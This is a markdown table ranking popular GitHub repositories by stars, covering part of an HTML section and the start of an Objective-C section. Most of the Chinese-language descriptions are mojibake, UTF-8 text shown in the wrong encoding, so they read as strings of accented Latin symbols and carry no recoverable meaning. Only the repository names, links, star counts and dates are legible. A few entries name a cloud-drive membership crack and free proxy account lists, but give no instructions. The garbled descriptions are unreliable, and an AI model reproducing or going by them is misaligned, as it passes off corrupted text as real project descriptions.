|136|[daacheng/PythonBasic](https://github.com/daacheng/PythonBasic)|Âπ≥Êó∂Â∑•‰Ωú‰∏≠Â∏∏Áî®ÁöÑPythonÈõ∂Á¢éÁü•ËØÜÊÄªÁªìÔºåÁà¨Ëô´Â≠¶‰π†ÊÄªÁªì‰∏éÁªÉ‰π†ÔºåPythonÊï∞ÊçÆÂàÜÊûêÂ≠¶‰π†ÊÄªÁªìÔºåÁõÆÂâçÊ≠£Âú®ÈáçÊñ∞Êï¥ÁêÜ‰∏≠......|334|HTML|10/28|
|137|[YUbuntu0109/YUbuntu0109.github.io](https://github.com/YUbuntu0109/YUbuntu0109.github.io)|üíñ üë©‚Äçüíª Â§ß‰∏ÄÂà∞Â§ß‰∏âÁöÑÁºñÁ®ãÂ≠¶‰π†Á¨îËÆ∞Ôºà updating ÔºâÔºöÁúüÂøÉÂ∏åÊúõËá™Â∑±ÁöÑËøô‰∫õÊó•Â∏∏Â≠¶‰π†Á¨îËÆ∞ÔºåÂøÉÂæóÔºåÂèäÈ°πÁõÆËÉΩÂ§üÂ∏ÆÂä©‰∏Ä‰∫õÂêåÂ≠¶ÊèêÈ´òÂ≠¶‰π†ÊïàÁéá ÔºÅ|333|HTML|09/18|
|138|[wx-chevalier/Backend-Series](https://github.com/wx-chevalier/Backend-Series)|:books: ÊúçÂä°Á´ØÂºÄÂèëÂÆûË∑µ‰∏éÂ∑•Á®ãÊû∂ÊûÑÔºåÊúçÂä°Á´ØÂü∫Á°ÄÁØá   ÂæÆÊúçÂä°‰∏é‰∫ëÂéüÁîüÁØá   Spring ÁØá   Node.js ÁØá   DevOps ÁØá   ‰ø°ÊÅØÂÆâÂÖ®‰∏éÊ∏óÈÄèÊµãËØïÁØá|331|HTML|10/22|
|139|[xiiiblue/flask-adminlte-scaffold](https://github.com/xiiiblue/flask-adminlte-scaffold)|flask-adminlte-scaffoldÊòØ‰∏Ä‰∏™PythonÁéØÂ¢É‰∏ãÁöÑWEBÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüËÑöÊâãÊû∂ÔºåÁõÆÊ†áÊòØÁî®ÊûÅÂ∞ëÈáèÁöÑ‰ª£Á†ÅÔºåÂø´ÈÄüÊûÑÂª∫Â∞èÂûãWEBÂ∫îÁî®„ÄÇ|331|HTML|08/20|
|140|[Womsxd/pandownload.com_Pages_Backup](https://github.com/Womsxd/pandownload.com_Pages_Backup)|pandownloadÈ°µÈù¢ÁöÑÂ§á‰ªΩÔºåÂ∫îËØ•ÊòØÊØîËæÉÂÆåÂÖ®ÁöÑ‰∏Ä‰ªΩ|322|HTML|08/16|
|141|[holylovelqq/vue-unit-test-with-jest](https://github.com/holylovelqq/vue-unit-test-with-jest)|ÂêÉÈÄèÊú¨‰ªìÂ∫ìÔºåÂèòË∫´vueÈ°πÁõÆÂçï‰ΩìÊµãËØïÂ§ßÁ•û|321|HTML|09/12|
|142|[Liberxue/liberxue.github.io](https://github.com/Liberxue/liberxue.github.io)|Liberxue blog for lightweight Jekyll  themes  ËΩªÈáèÁ∫ßËá™ÈÄÇÂ∫î ÁÆÄÊ¥Å Âç°ÁâáÂºèÂçöÂÆ¢‰∏ªÈ¢ò 3ÁßíÊêûÂÆöGitHub blog|320|HTML|10/22|
|143|[JokerJohn/bilibili_notes](https://github.com/JokerJohn/bilibili_notes)|ÊîªÂüéÁãÆ‰πãÂÆ∂BÁ´ôËØæÁ®ãËØæ‰ª∂ÂêàÈõÜÔºå2Âè∑‰ªìÂ∫ìÂú∞ÂùÄhttps://github.com/JokerJohn/bilibli_notes2.git|317|HTML|02/02|
|144|[zhongzhong0505/CodeBe](https://github.com/zhongzhong0505/CodeBe)|CodeBe(Á†ÅÂ∏Å)ÊòØ‰∏Ä‰∏™ÊòØ‰ΩøÁî®angular2Êï¥ÂêàÂêÑÁßçÊèí‰ª∂ÁöÑÈ°πÁõÆÔºåÂåÖÊã¨ÔºàlayerÔºåbootstrap-tableÔºåmarkdownÁºñËæëÂô®ÔºåhighchartsÔºåckeditorÔºåÈ´òÂæ∑Âú∞Âõæ,fullcalendar Á≠âÁ≠âÔºâ„ÄÇÂ¶ÇÊûú‰Ω†Êúâ‰ªÄ‰πàÊÉ≥Ë¶ÅÈõÜÊàêÁöÑÊèí‰ª∂ÔºåËØ∑ÂëäËØâÊàëÔºåÊàëÊù•Âä†ËøõÂéª„ÄÇ(ËØ∑ÁªôÊàëÂä†‰∏™ÊòüÔºåË∞¢Ë∞¢„ÄÇ)|308|HTML|10/20|
|145|[stellarkey/912_project](https://github.com/stellarkey/912_project)|Ê∏ÖÂçéÂ§ßÂ≠¶ËÆ°ÁÆóÊú∫Á≥ªËÄÉÁ†îÊîªÁï• Guidance for postgraduate entrance examination in Department of Computer Science and Technology, Tsinghua University|308|HTML|10/09|
|146|[ojeveryday/AlgoWiki](https://github.com/ojeveryday/AlgoWiki)|ÊÄªÁªìÁÆóÊ≥ïÂà∑È¢òÂ•óË∑ØÔºåÂú®Á∫øÈòÖËØªÔºö|303|HTML|07/09|
|147|[Kivy-CN/MLAPP-CN](https://github.com/Kivy-CN/MLAPP-CN)|A Chinese Notes of MLAPPÔºåMLAPP ‰∏≠ÊñáÁ¨îËÆ∞È°πÁõÆ  https://zhuanlan.zhihu.com/python-kivy|302|HTML|09/17|
|148|[cncounter/translation](https://github.com/cncounter/translation)|ÁøªËØëÊñáÊ°£|302|HTML|10/25|
|149|[huangz1990/blog](https://github.com/huangz1990/blog)|ÊàëÁöÑ‰∏™‰∫∫ÂçöÂÆ¢„ÄÇ|300|HTML|09/07|
|150|[cnych/qikqiak.com](https://github.com/cnych/qikqiak.com)|ÂÖ≥Ê≥®ÂÆπÂô®„ÄÅkubernetes„ÄÅdevops„ÄÅpython„ÄÅgolang„ÄÅÂæÆÊúçÂä°Á≠âÊäÄÊúØ üéâüéâüéâ|297|HTML|10/08|
|151|[nimoc/blog](https://github.com/nimoc/blog)|nimo ÂçöÂÆ¢|291|HTML|07/20|
|152|[CruxF/IMOOC](https://github.com/CruxF/IMOOC)|IMOCCËæõÂã§ÁöÑÊê¨ËøêÂ∑•:fire:|289|HTML|09/04|
|153|[xizhibei/blog](https://github.com/xizhibei/blog)|‰∏™‰∫∫ÂçöÂÆ¢Ôºå(Node.js/Golang/Backend/DevOps)ÔºåÊ¨¢Ëøé Star, Watch ËÆ¢ÈòÖ‰ª•ÂèäËØÑËÆ∫|285|HTML|10/26|
|154|[roy-tian/learning-area](https://github.com/roy-tian/learning-area)|MDN Â≠¶‰π†Âå∫Á§∫‰æã‰∏≠ÊñáÁâà|277|HTML|09/26|
|155|[cirosantilli/china-dictatorship](https://github.com/cirosantilli/china-dictatorship)|Chinese ""Communist"" ""Dictatorship"" ""facts"". ‰∏≠ÂõΩ„ÄäÂÖ±‰∫ß‰∏ª‰πâ„Äã„ÄäÁã¨Ë£ÅÁªüÊ≤ª„ÄãÁöÑ„Ää‰∫ãÂÆû„Äã„ÄÇHome to the mega-FAQ, news compilation, restaurant and music recommendations. Â∏∏ËßÅÈóÆÁ≠îÈõÜÔºåÊñ∞ÈóªÈõÜÂíåÈ•≠Â∫óÂíåÈü≥‰πêÂª∫ËÆÆ„ÄÇHeil Xi Âçê. ‰π†‰∏áÂ≤Å„ÄÇ|275|HTML|10/28|
|156|[LinDaiDai/niubility-coding-js](https://github.com/LinDaiDai/niubility-coding-js)|üìí  ÈúñÂëÜÂëÜÁöÑ‰∏™‰∫∫ÂçöÂÆ¢Ê±áÊÄª|273|HTML|09/07|
|157|[gfw-breaker/open-proxy](https://github.com/gfw-breaker/open-proxy)|‰∏ÄÈîÆÈÉ®ÁΩ≤Ë¢´Â¢ôÁΩëÁ´ôÂèçÂêë‰ª£ÁêÜ; ÂÖçÁøªÂ¢ôËÆøÈóÆË¢´Á¶ÅÁΩëÁ´ô|270|HTML|10/25|
|158|[umelabs/node.umelabs.dev](https://github.com/umelabs/node.umelabs.dev)|ÊØèÂ§©20:00ÁÇπÊõ¥Êñ∞ÂÖçË¥πSS/SSRËäÇÁÇπ|267|HTML|10/29|
|159|[shengxinjing/vue3-vs-vue2](https://github.com/shengxinjing/vue3-vs-vue2)|„ÄäÂâçÁ´Ø‰ºöÂÆ¢ÂéÖÁ¨¨‰∏ÄÊúü‰ª£Á†Å„ÄãÂíåÂ∞§Â§ßËÅävue3ÁöÑ ÊèêÂçá|265|HTML|09/12|
|160|[fwonggh/Bthub](https://github.com/fwonggh/Bthub)|BthubÊúÄÊñ∞Âú∞ÂùÄÂèëÂ∏ÉÈ°µ|263|HTML|10/15|
|161|[hpoenixf/hpoenixf.github.io](https://github.com/hpoenixf/hpoenixf.github.io)|ÂçöÂÆ¢ÊñáÁ´†ÔºåÂê´ÂâçÁ´ØËøõÈò∂Á≥ªÂàó|256|HTML|07/09|
|162|[Thobian/typora-plugins-win-img](https://github.com/Thobian/typora-plugins-win-img)|Ëß£ÂÜ≥windowsÔºåtypora‰∏çÊîØÊåÅÁ≤òË¥¥Ëá™Âä®‰∏ä‰º†ÂõæÁâáÂà∞ÊúçÂä°ÁöÑÈóÆÈ¢ò„ÄÇ|255|HTML|08/29|
|163|[DTStack/jlogstash](https://github.com/DTStack/jlogstash)|java ÁâàÊú¨ÁöÑlogstash|247|HTML|10/13|
|164|[373675032/moti-cloud](https://github.com/373675032/moti-cloud)|Ëé´ÊèêÁΩëÁõòÔºöSpringBoot+MyBatis+ThymeLeaf+BootStrap„ÄÇÈÄÇÂêàÂàùÂ≠¶ËÄÖÔºåÂñúÊ¨¢ÁöÑÂ∞è‰ºô‰º¥ÂèØ‰ª•ÁÇπ‰∏äÈù¢ÁöÑStarÊîØÊåÅ‰∏Ä‰∏ãÂòõÔºÅ|246|HTML|06/03|
|165|[Wscats/blog](https://github.com/Wscats/blog)|È£é‰∏≠Êå•ËàûÁãÇ‰π±ÁöÑÂèåÊâãÔºåÂÜô‰∏ãÁÅøÁÉÇÁöÑËØóÁØáÔºå‰∏çÁÆ°ÊúâÂ§ö‰πàÁñ≤ÂÄ¶|240|HTML|10/06|
|166|[mzkmzk/Read](https://github.com/mzkmzk/Read)|ÈòÖËØªÊÄªÁªì|239|HTML|10/23|
|167|[iwxf/free-v2ray](https://github.com/iwxf/free-v2ray)|ÊØèÂ§©Êõ¥Êñ∞ÔºåÂàÜ‰∫´ÂÖçË¥πV2RayË¥¶Âè∑„ÄÅËÆ¢ÈòÖÈìæÊé•ÔºåV2RayÁøªÂ¢ôÁßëÂ≠¶‰∏äÁΩëÊïôÁ®ã„ÄÇ|237|HTML|10/29|
|168|[ufologist/wechat-mp-article](https://github.com/ufologist/wechat-mp-article)|È´òÈ¢úÂÄºÁöÑÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÂõæÊñáÊ∂àÊÅØÊéíÁâà|233|HTML|02/13|
|169|[cjql/archive](https://github.com/cjql/archive)|ËÆ°ÁÆóÊú∫„ÄÅÊñáÂè≤„ÄÅË¥¢ÁªèÁ≠âÁöÑÁîµÂ≠ê‰π¶„ÄÅÁΩëÂùÄÊî∂Ëóè„ÄÇhttps://cjql.github.io/archive/|231|HTML|04/29|
|170|[Micircle/scratch3.0-note](https://github.com/Micircle/scratch3.0-note)|scratch 3.0 ÂºÄÂèëÁ¨îËÆ∞|230|HTML|07/28|
|171|[shengxinjing/imooc-echarts](https://github.com/shengxinjing/imooc-echarts)|imoocÁöÑechartsÂÖ•Èó®ÊïôÁ®ã|227|HTML|08/26|
|172|[doocs/doocs.github.io](https://github.com/doocs/doocs.github.io)|üíÅ‚Äç‚ôÄÔ∏è Welcome to the Doocs Open Source organization   Ê¨¢ËøéÂä†ÂÖ• Doocs ÂºÄÊ∫êÁ§æÂå∫|226|HTML|10/20|
|173|[s3131212/gotyour.pw](https://github.com/s3131212/gotyour.pw)|Got Your PW ÊòØ‰∏ÄÂÄãÁ∞°ÊòìÁöÑË≥áÂÆâË≥áÊ∫êÁ∂≤Á´ôÔºåÂåÖÂê´Â∏∏Áî®ÁöÑÂ∑•ÂÖ∑ÔºåÈÅ©ÂêàÂàùÂ≠∏ËÄÖÁöÑÂÖ•ÈñÄÊïôÊùêÔºåÂíåË®±Â§öÂÄºÂæóËøΩËπ§ÁöÑË≥áÂÆâÁõ∏ÈóúÁ∂≤Á´ô„ÄÇ|223|HTML|10/21|
|174|[fmzquant/fmz_extend_api_demo](https://github.com/fmzquant/fmz_extend_api_demo)|Èõ∂ÊàêÊú¨Âø´ÈÄüÊâìÈÄ†‰Ω†Ëá™Â∑±‰∏ìÂ±ûÁöÑÂ§öÁî®Êà∑ÈáèÂåñ‰∫§ÊòìÂπ≥Âè∞|221|HTML|06/04|
|175|[yangchuansheng/prometheus-handbook](https://github.com/yangchuansheng/prometheus-handbook)|Prometheus ‰∏≠ÊñáÊñáÊ°£|220|HTML|06/23|
|176|[fguby/Electron-elf](https://github.com/fguby/Electron-elf)|‰ΩøÁî®electronÂíålive2DÂºÄÂèëÁöÑÁ±ª‰ººÊ°åÈù¢Á≤æÁÅµÁöÑÂ∫îÁî®ÔºàA desktop application developed using electron and live2DÔºâ|216|HTML|09/17|
|177|[OBKoro1/web_accumulate](https://github.com/OBKoro1/web_accumulate)|ÂâçÁ´ØËøõÈò∂ÁßØÁ¥Ø:http://obkoro1.com/web_accumulate/accumulate/|216|HTML|07/13|
|178|[wx-chevalier/Product-Series](https://github.com/wx-chevalier/Product-Series)|:books: ‰∫ßÂìÅËø∑ÊÄùÔºå‰∏ç‰ªÖ‰ªÖÊòØ‰∫ßÂìÅÁªèÁêÜÔºåÂØπ‰∫é‰∫ßÂìÅËÆæËÆ°„ÄÅ‰∫§‰∫í‰ΩìÈ™å„ÄÅÈ°πÁõÆÁÆ°ÁêÜ„ÄÅË°å‰∏öËßÜÁÇπÁ≠âÂ§öÊñπÈù¢ÁöÑÊÄùËÄÉ„ÄÇ|213|HTML|10/24|
|179|[openwhu/OpenWHU](https://github.com/openwhu/OpenWHU)|Ê≠¶Ê±âÂ§ßÂ≠¶ËØæÁ®ãËµÑÊñôÊï¥ÁêÜ-WHUËØæ‰ª£Ë°®ËÆ°Âàí|212|HTML|10/29|
|180|[MindFxck/daguguguji](https://github.com/MindFxck/daguguguji)|„ÄäÁâπÂ∏àÊñáÈõÜ„Äã‚Äî‚ÄîÂ§ßÂíïÂíïÂíïÈ∏°Ëëó|210|HTML|07/24|
|181|[dennis-jiang/Front-End-Knowledges](https://github.com/dennis-jiang/Front-End-Knowledges)|ÂâçÁ´ØÁü•ËØÜËøõÈò∂|210|HTML|10/27|
|182|[daliansky/daliansky.github.io](https://github.com/daliansky/daliansky.github.io)|ÈªëÊûúÂ∞èÂÖµÁöÑÈÉ®ËêΩÈòÅ|209|HTML|10/29|
|183|[mengkunsoft/OneQRCode](https://github.com/mengkunsoft/OneQRCode)|üì± ÂæÆ‰ø°„ÄÅÊîØ‰ªòÂÆù„ÄÅQQ ‰∏âÂêà‰∏ÄÊî∂Ê¨æ‰∫åÁª¥Á†ÅÔºàÂçïÊñá‰ª∂ÁâàÔºâ|209|HTML|07/20|
|184|[Terminus2049/Not-exist-in-douban](https://github.com/Terminus2049/Not-exist-in-douban)|Ë±ÜÁì£‰∏çÂ≠òÂú®ÁöÑ‰π¶ÂΩ±Èü≥|208|HTML|04/02|
|185|[xiongbao/we.dog](https://github.com/xiongbao/we.dog)|Êàë‰ª¨ÊòØÁãóÔºåËàîÁãó„ÄÇÂøÉÈÖ∏ÁöÑËàîÁãóÊó•ËÆ∞„ÄÇ|206|HTML|05/20|
|186|[fguby/live2D](https://github.com/fguby/live2D)|Êù•ÂÆöÂà∂‰∏Ä‰∏™Ëá™Â∑±‰∏ìÂ±ûÁöÑlive2DÁúãÊùøÂ®òÂêß(‡πë‚Ä¢ÃÄ„ÖÇ‚Ä¢ÃÅ)Ÿà‚úß|206|HTML|02/05|
|187|[giscafer/blog](https://github.com/giscafer/blog)|:books: ÂâçÁ´ØÊâãÂÜå & ‰∏™‰∫∫Â≠¶‰π†ÊÄªÁªìÂçöÂÆ¢|205|HTML|09/25|
|188|[2010yhh/springBoot-demos](https://github.com/2010yhh/springBoot-demos)|springBoot-demosÂü∫‰∫é1.5.xÁâàÊú¨|200|HTML|10/13|
|189|[xianyunyh/spider_job](https://github.com/xianyunyh/spider_job)|ÊãõËÅòÁΩëÊï∞ÊçÆÁà¨Ëô´|198|HTML|09/19|
|190|[jjeejj/geektime2pdf](https://github.com/jjeejj/geektime2pdf)|ÊûÅÂÆ¢Êó∂Èó¥‰∏ìÊ†èÊñáÁ´† ËΩ¨‰∏∫ PDF ÂåÖÂê´ËØÑËÆ∫ Èü≥È¢ë|195|HTML|04/22|
|191|[GitDzreal93/dev-tester](https://github.com/GitDzreal93/dev-tester)|ÊµãËØïÂºÄÂèëÈù¢ËØïËµÑÊ∫ê„ÄÅÂ§ç‰π†ËµÑÊñôÊ±áÊÄª|194|HTML|07/18|
|192|[ty6815/AvStackDocs](https://github.com/ty6815/AvStackDocs)|Èü≥ËßÜÈ¢ëÂü∫Á°ÄÁü•ËØÜÊï¥ÁêÜÂíåÁõ∏ÂÖ≥ÂçèËÆÆÊñáÊ°£ËØ¥Êòé|191|HTML|10/27|
|193|[minkolee/django2-by-example-ZH](https://github.com/minkolee/django2-by-example-ZH)|Django 2 by example‰∏™‰∫∫ÁøªËØëÂíåÊï¥ÁêÜ|190|HTML|05/09|
|194|[calmound/web](https://github.com/calmound/web)|Â≠¶‰π†È°πÁõÆ|189|HTML|10/01|
|195|[jimersylee/jimersylee.github.io](https://github.com/jimersylee/jimersylee.github.io)|‰∏™‰∫∫ÂçöÂÆ¢|183|HTML|07/18|
|196|[tengshe789/SpringCloud-miaosha](https://github.com/tengshe789/SpringCloud-miaosha)|‰∏Ä‰∏™Âü∫‰∫éspring cloud GreenwichÁöÑÁÆÄÂçïÁßíÊùÄÁîµÂ≠êÂïÜÂüéÈ°πÁõÆÔºåÈÄÇÂêàÊñ∞‰∫∫ÈòÖËØª„ÄÇA simple spring cloud based seckill shopping mall project, suitable for young people to read. It can be used as a paper material for academic defense.|182|HTML|09/10|
|197|[FrankKai/FrankKai.github.io](https://github.com/FrankKai/FrankKai.github.io)|Ë∂Å‰Ω†ËøòÂπ¥ËΩªÁöÑÊäÄÊúØÂçöÂÆ¢Ôºå‰∏ªË¶ÅÂåÖÊã¨ÂâçÁ´ØÔºåNodeJSÔºåËøêÁª¥ÂíåÈöèÊÉ≥„ÄÇÊñáÁ´†Âú®issues„ÄÇÁõÆÂâç‰∏ªË¶Å‰ªé‰∫ãÂâçÁ´ØÂºÄÂèëÂ∑•‰Ωú„ÄÇ|182|HTML|10/27|
|198|[boism-org/northpole](https://github.com/boism-org/northpole)|Â≠òÂÇ®ÂåóÊûÅÂ≠¶Ê¥æÁöÑÂì≤Â≠¶ÔºåÊÄùËÄÉÔºåÊïô‰πârepository|181|HTML|04/15|
|199|[tobycroft/BiliHP-APP](https://github.com/tobycroft/BiliHP-APP)|BiliBiliÂä©Êâã-ÂìîÂì©ÂìîÂì©Âä©ÊâãËãπÊûú/ÂÆâÂçì/IOS/PC/C2C/Mac/Ë∑ØÁî±Âô®/ÂçïÁî®Êà∑/Â§öÁî®Êà∑/ÊâãÊú∫ÁâàÂÖ®Âπ≥Âè∞ÊîØÊåÅÊåÇÊú∫ËΩØ‰ª∂Â∫ìÔºà2020-BiliHPÔºâ|180|HTML|07/30|
|200|[vim-china/vim-china.org](https://github.com/vim-china/vim-china.org)|Vim ‰∏≠ÊñáÁ§æÂå∫‰∫ãÂä°ËÆ®ËÆ∫|179|HTML|09/10|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## Objective-C

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[MustangYM/WeChatExtension-ForMac](https://github.com/MustangYM/WeChatExtension-ForMac)|MacÂæÆ‰ø°ÂäüËÉΩÊãìÂ±ï/ÂæÆ‰ø°Êèí‰ª∂/ÂæÆ‰ø°Â∞èÂä©Êâã(A plugin for Mac WeChat)|11.1k|Objective-C|10/29|
|2|[CodeTips/BaiduNetdiskPlugin-macOS](https://github.com/CodeTips/BaiduNetdiskPlugin-macOS)|For macOS.ÁôæÂ∫¶ÁΩëÁõò Á†¥Ëß£SVIP„ÄÅ‰∏ãËΩΩÈÄüÂ∫¶ÈôêÂà∂~|8.5k|Objective-C|10/17|
|3|[banchichen/TZImagePickerController](https://github.com/banchichen/TZImagePickerController)|‰∏Ä‰∏™ÊîØÊåÅÂ§öÈÄâ„ÄÅÈÄâÂéüÂõæÂíåËßÜÈ¢ëÁöÑÂõæÁâáÈÄâÊã©Âô®ÔºåÂêåÊó∂ÊúâÈ¢ÑËßà„ÄÅË£ÅÂâ™ÂäüËÉΩÔºåÊîØÊåÅiOS6+„ÄÇ  A clone of UIImagePickerController, support picking multiple photos„ÄÅoriginal photo„ÄÅvideo, also allow preview photo and video, support iOS6+|7.4k|Objective-C|10/29|
|4|[halfrost/Halfrost-Field](https://github.com/halfrost/Halfrost-Field)|‚úçüèª ËøôÈáåÊòØÂÜôÂçöÂÆ¢ÁöÑÂú∞Êñπ ‚Äî‚Äî Halfrost-Field ÂÜ∞Èúú‰πãÂú∞|6.8k|Objective-C|09/20|
|5|[renzifeng/ZFPlayer](https://github.com/renzifeng/ZFPlayer)|Support customization of any player SDK and control layer(ÊîØÊåÅÂÆöÂà∂‰ªª‰ΩïÊí≠ÊîæÂô®SDKÂíåÊéßÂà∂Â±Ç)|6.4k|Objective-C|09/18|
|6|[ChenYilong/CYLTabBarController](https://github.com/ChenYilong/CYLTabBarController)|[EN]It is an iOS UI module library for adding animation to iOS tabbar items and icons with Lottie, and adding a bigger center UITabBar Item.  [CN]„Äê‰∏≠ÂõΩÁâπËâ≤ TabBar„Äë‰∏ÄË°å‰ª£Á†ÅÂÆûÁé∞ Lottie Âä®ÁîªTabBarÔºåÊîØÊåÅ‰∏≠Èó¥Â∏¶+Âè∑ÁöÑTabBarÊ†∑ÂºèÔºåËá™Â∏¶Á∫¢ÁÇπËßíÊ†áÔºåÊîØÊåÅÂä®ÊÄÅÂà∑Êñ∞„ÄÇ„ÄêiOS13 & Dark Mode  & iPhone XS MAX supported„Äë|6.3k|Objective-C|05/19|
|7|[gsdios/SDCycleScrollView](https://github.com/gsdios/SDCycleScrollView)|Autoscroll Banner.   Êó†ÈôêÂæ™ÁéØÂõæÁâá„ÄÅÊñáÂ≠óËΩÆÊí≠Âô®„ÄÇ|5.9k|Objective-C|09/27|
|8|[Tencent/QMUI_iOS](https://github.com/Tencent/QMUI_iOS)|QMUI iOS‚Äî‚ÄîËá¥Âäõ‰∫éÊèêÈ´òÈ°πÁõÆ UI ÂºÄÂèëÊïàÁéáÁöÑËß£ÂÜ≥ÊñπÊ°à|5.9k|Objective-C|09/29|
|9|[Sunnyyoung/WeChatTweak-macOS](https://github.com/Sunnyyoung/WeChatTweak-macOS)|A dynamic library tweak for WeChat macOS - È¶ñÊ¨æÂæÆ‰ø° macOS ÂÆ¢Êà∑Á´ØÊí§ÂõûÊã¶Êà™‰∏éÂ§öÂºÄ|5.1k|Objective-C|04/28|
|10|[pujiaxin33/JXCategoryView](https://github.com/pujiaxin33/JXCategoryView)|A powerful and easy to use category view (segmentedcontrol, segmentview, pagingview, pagerview, pagecontrol) (ËÖæËÆØÊñ∞Èóª„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅQQÈü≥‰πê„ÄÅÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅ‰∫¨‰∏ú„ÄÅÁà±Â•áËâ∫„ÄÅËÖæËÆØËßÜÈ¢ë„ÄÅÊ∑òÂÆù„ÄÅÂ§©Áå´„ÄÅÁÆÄ‰π¶„ÄÅÂæÆÂçöÁ≠âÊâÄÊúâ‰∏ªÊµÅAPPÂàÜÁ±ªÂàáÊç¢ÊªöÂä®ËßÜÂõæ)|4.9k|Objective-C|10/28|
|11|[crazycodeboy/RNStudyNotes](https://github.com/crazycodeboy/RNStudyNotes)|React Native Á†îÁ©∂‰∏éÂÆûË∑µ|3.8k|Objective-C|07/27|
|12|[alibaba/LuaViewSDK](https://github.com/alibaba/LuaViewSDK)|A cross-platform framework to build native, dynamic and swift user interface - Âº∫Â§ßËΩªÂ∑ßÁÅµÊ¥ªÁöÑÂÆ¢Êà∑Á´ØÂä®ÊÄÅÂåñËß£ÂÜ≥ÊñπÊ°à|3.5k|Objective-C|02/11|
|13|[CoderZhuXH/XHLaunchAd](https://github.com/CoderZhuXH/XHLaunchAd)|üî•The screen opening advertising solutions - ÂºÄÂ±èÂπøÂëä„ÄÅÂêØÂä®ÂπøÂëäËß£ÂÜ≥ÊñπÊ°à-ÊîØÊåÅÈùôÊÄÅ/Âä®ÊÄÅÂõæÁâáÂπøÂëä,mp4ËßÜÈ¢ëÂπøÂëä,ÂÖ®Â±è/ÂçäÂ±èÂπøÂëä„ÄÅÂÖºÂÆπiPhone/iPad. „Äê Github‰∏ãËΩΩ‰∏ç‰∫Ü/‰∏ãËΩΩÊÖ¢ ÂèØ‰ª•ËÆøÈóÆÂõΩÂÜÖ‰∏ãËΩΩÂú∞ÂùÄ: https://gitee.com/CoderZhuXH/XHLaunchAd„Äë|3.4k|Objective-C|05/06|
|14|[JackJiang2011/MobileIMSDK](https://github.com/JackJiang2011/MobileIMSDK)|‰∏Ä‰∏™ÂéüÂàõÁßªÂä®Á´ØIMÈÄö‰ø°Â±ÇÊ°ÜÊû∂ÔºåËΩªÈáèÁ∫ß„ÄÅÈ´òÂ∫¶ÊèêÁÇºÔºåÂéÜÁªè8Âπ¥„ÄÅ‰πÖÁªèËÄÉÈ™å„ÄÇÂèØËÉΩÊòØÂ∏ÇÈù¢‰∏äÂîØ‰∏ÄÂêåÊó∂ÊîØÊåÅUDP+TCP‰∏§ÁßçÂçèËÆÆÁöÑÂêåÁ±ªÊ°ÜÊû∂ÔºåÊîØÊåÅiOS„ÄÅAndroid„ÄÅJavaÔºåÊúçÂä°Á´ØÂü∫‰∫éNetty„ÄÇ|3.2k|Objective-C|10/23|
|15|[zhengwenming/WMPlayer](https://github.com/zhengwenming/WMPlayer)|WMPlayer-AVPlayerÁöÑÂ∞ÅË£ÖÔºåÁªßÊâøUIViewÔºåÊîØÊåÅpodsÔºåÊâãÂäøÂø´Ëøõ„ÄÅÂø´ÈÄÄÔºåÂÖ®Èù¢ÈÄÇÈÖçÂÖ®Èù¢Â±èÔºåÂêåÊó∂ÊîØÊåÅÁΩëÁªúÂíåÊú¨Âú∞ËßÜÈ¢ëÁöÑÊí≠Êîæ|3.1k|Objective-C|06/08|
|16|[MxABC/LBXScan](https://github.com/MxABC/LBXScan)|A barcode and qr code scanner (‰∫åÁª¥Á†Å„ÄÅÊâ´Á†Å„ÄÅÊâ´‰∏ÄÊâ´„ÄÅZXing„ÄÅZBar„ÄÅiOSÁ≥ªÁªüAVFoundationÊâ´Á†ÅÂ∞ÅË£ÖÔºåÊâ´Á†ÅÁïåÈù¢ÊïàÊûúÂ∞ÅË£Ö)|3.0k|Objective-C|10/16|
|17|[12207480/TYAttributedLabel](https://github.com/12207480/TYAttributedLabel)|TYAttributedLabel ÁÆÄÂçïÔºåÂº∫Â§ßÁöÑÂ±ûÊÄßÊñáÊú¨Êéß‰ª∂(Êó†ÈúÄ‰∫ÜËß£CoreText)ÔºåÊîØÊåÅÂõæÊñáÊ∑∑ÊéíÊòæÁ§∫ÔºåÊîØÊåÅÊ∑ªÂä†ÈìæÊé•ÔºåimageÂíåUIViewÊéß‰ª∂ÔºåÊîØÊåÅËá™ÂÆö‰πâÊéíÁâàÊòæÁ§∫|2.8k|Objective-C|09/24|
|18|[wangrui460/WRNavigationBar](https://github.com/wangrui460/WRNavigationBar)|Ô£øË∂ÖÁÆÄÂçïÔºÅÔºÅÔºÅ ‰∏ÄË°å‰ª£Á†ÅËÆæÁΩÆÁä∂ÊÄÅÊ†è„ÄÅÂØºËà™Ê†èÊåâÈíÆ„ÄÅÊ†áÈ¢ò„ÄÅÈ¢úËâ≤„ÄÅÈÄèÊòéÂ∫¶ÔºåÁßªÂä®Á≠â    WRNavigationBar which allows you to change NavigationBar's appearance dynamically|2.8k|Objective-C|05/09|
|19|[ripperhe/Bob](https://github.com/ripperhe/Bob)|Bob ÊòØ‰∏ÄÊ¨æ Mac Á´ØÁøªËØëËΩØ‰ª∂ÔºåÊîØÊåÅÂàíËØçÁøªËØë„ÄÅÊà™ÂõæÁøªËØë‰ª•ÂèäÊâãÂä®ËæìÂÖ•ÁøªËØë„ÄÇ|2.7k|Objective-C|10/23|
|20|[rime/squirrel](https://github.com/rime/squirrel)|„ÄêÈº†È¨öÁÆ°„ÄëRime for macOS|2.7k|Objective-C|09/21|
|21|[liberalisman/iOS-InterviewQuestion-collection](https://github.com/liberalisman/iOS-InterviewQuestion-collection)|iOS ÂºÄÂèëËÄÖÂú®Èù¢ËØïËøáÁ®ã‰∏≠ÔºåÂ∏∏ËßÅÁöÑ‰∏Ä‰∫õÈù¢ËØïÈ¢òÔºåÂª∫ËÆÆÂ∞ΩÈáèÂºÑÊáÇ‰∫ÜÂéüÁêÜÔºåÂπ∂‰∏îÂ§öÂÆûË∑µ„ÄÇ|2.5k|Objective-C|09/27|
